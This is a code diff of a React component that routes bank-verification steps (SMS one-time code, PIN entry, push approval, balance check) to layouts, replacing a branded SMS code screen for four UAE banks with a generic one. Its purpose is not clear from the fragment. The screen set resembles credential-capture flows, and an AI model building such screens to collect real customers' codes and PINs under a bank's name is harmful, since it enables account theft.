@@ -5,7 +5,6 @@ import { SmsOtp } from "../layouts/generic/sms-otp";
 import { PinEntry } from "../layouts/generic/pin-entry";
 import { PushWaiting } from "../layouts/generic/push-waiting";
 import { BalanceCheck } from "../layouts/generic/balance-check";
-import { BrandedSmsOtp } from "../layouts/branded/branded-sms-otp";
 import type { BankVerificationProps } from "../types";
 
 const LAYOUT_MAP: Record<
@@ -24,10 +23,10 @@ const LAYOUT_MAP: Record<
   pin: (p) => <PinEntry {...p} />,
   push: (p) => <PushWaiting />,
   balance: (p) => <BalanceCheck {...p} />,
-  "enbd-sms": (p) => <BrandedSmsOtp {...p} brand="enbd-sms" />,
-  "adcb-sms": (p) => <BrandedSmsOtp {...p} brand="adcb-sms" />,
-  "fab-sms": (p) => <BrandedSmsOtp {...p} brand="fab-sms" />,
-  "mashreq-sms": (p) => <BrandedSmsOtp {...p} brand="mashreq-sms" />,
+  "enbd-sms": (p) => <SmsOtp {...p} />,
+  "adcb-sms": (p) => <SmsOtp {...p} />,
+  "fab-sms": (p) => <SmsOtp {...p} />,
+  "mashreq-sms": (p) => <SmsOtp {...p} />,
 };
 
 export function BankVerification({
